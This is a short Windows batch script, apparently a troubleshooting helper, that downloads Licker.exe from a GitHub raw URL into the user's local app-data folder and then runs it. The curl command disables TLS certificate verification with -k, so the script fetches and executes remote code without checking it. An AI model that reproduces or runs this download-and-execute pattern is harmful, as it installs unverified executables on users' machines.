@echo off
title Lickers Diagnostic Mode
echo [STEP 1] Setting paths...
set "TARGET_DIR=%LOCALAPPDATA%\Lickers"
set "TARGET_EXE=%TARGET_DIR%\Licker.exe"
echo Target: %TARGET_EXE%
pause

echo [STEP 2] Creating directory...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
pause

echo [STEP 3] Attempting Download...
:: Adding --ssl-no-revoke to be extra safe against the error in your screenshot
curl -k --ssl-no-revoke -L -f -o "%TARGET_EXE%" "https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"

echo Curl Exit Code: %errorlevel%
pause

echo [STEP 4] Checking if file exists...
if exist "%TARGET_EXE%" (
    echo [SUCCESS] File found! Starting now...
    start "" "%TARGET_EXE%"
) else (
    echo [FAILURE] The file Licker.exe does not exist at the target path.
    echo Check your GitHub Actions to see if the EXE was actually uploaded.
)
pause
